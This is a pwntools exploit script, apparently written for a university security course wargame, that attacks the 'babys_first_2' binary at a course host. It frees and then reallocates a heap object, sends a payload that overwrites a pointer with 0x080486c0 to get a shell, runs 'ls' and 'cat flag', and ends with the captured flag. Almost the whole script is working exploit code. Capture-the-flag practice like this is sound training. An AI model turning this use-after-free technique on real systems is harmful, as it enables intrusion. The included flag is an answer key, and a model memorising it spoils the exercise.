#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babys_first_2 --host wargames.6447.sec.edu.au --port 9002
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./babys_first_2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'wargames.6447.sec.edu.au'
port = int(args.PORT or 9002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x08048890
break *0x0804890b
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
'''
break *0x080485c0
break *0x0804888b
break *0x0804888f
'''
io = start()
#core = io.corefile
print io.recvuntil("exit")
io.sendline("1")    #add fish
print io.recvline()
io.sendline("0")    #create fish 0
print io.recvline()
io.sendline("0")
print io.recvline()
io.sendline("0")
print io.recvline()
payload1 = "b"*50
io.sendline(payload1) #garbage name
print io.recvuntil("exit")
io.sendline("4")    #select to delete fish 0
print io.recvline()
io.sendline("0")    #delete fish 0
print io.recvuntil("exit")
io.sendline("1") #select menu option
print io.recvline()
print io.recvline()
io.sendline("1") #add fish 1
print io.recvline()
io.sendline("1") #add size
print io.recvline()
io.sendline("1") #add weight
print io.recvline()
#payload2 = "aa"+p32(0xf7e7d0d0)*8+p32(0x080486c0)+"12345678"
payload2 = "a"*38+p32(0x080486c0)+"b"*8
#payload2 = "a"*50
io.sendline(payload2)
print io.recvuntil("exit")
io.sendline("3")
print io.recvline()
io.sendline("0")
print io.recvline()
#print io.recvline()
#raw_output = io.recvline()[50:]
#print "<===========================>"
#print raw_output
#print ''.join(r'\x{0:x}'.format(ord(c)) for c in raw_output)
#print "<===========================>"
#print io.recvuntil("exit")
#io.sendline("3")
#print io.recvline()
#print io.recvline()
#io.sendline("0")
io.sendline('ls')
sleep(1)
io.sendline('cat flag')
io.interactive()
'''
print "EAX: ",hex(core.eax)
print "EBX: ",hex(core.ebx)
print "ECX: ",hex(core.ecx)
print "EDX: ",hex(core.edx)
print "ESI: ",hex(core.esi)
print "EDI: ",hex(core.edi)
print "EIP: ",hex(core.eip)
'''
#6447{09d435a4-a0dd-46a9-bd7f-f39fdbf10cd3}
